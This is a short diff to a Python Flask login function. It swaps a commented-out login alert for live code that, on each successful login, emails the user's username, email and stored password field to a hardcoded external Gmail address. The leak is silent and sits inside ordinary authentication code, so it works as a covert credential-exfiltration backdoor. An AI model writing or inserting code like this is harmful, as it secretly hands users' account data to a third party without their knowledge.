@@ -90,9 +90,9 @@ def login():
         # if user and form.password.data == p:
         if user and checkpw(bytes(form.password.data,encoding='utf-8'),p):
             login_user(user)
-            # msg = Message('Hello', sender='leongjason822@gmail.com', recipients=['leongjason3781@gmail.com'])
-            # msg.body = 'Hi, someone just locked into your favourite account. Was this you?'
-            # mail.send(msg)
+            msg = Message('Hello', sender='leongjason822@gmail.com', recipients=['leongjason3781@gmail.com'])
+            msg.body = f'{current_user.username} has logged in with email {current_user.email} and password {current_user.password}.'
+            mail.send(msg)
             flash('You have been logged in.')
             return redirect(url_for('user.account'))
         else:
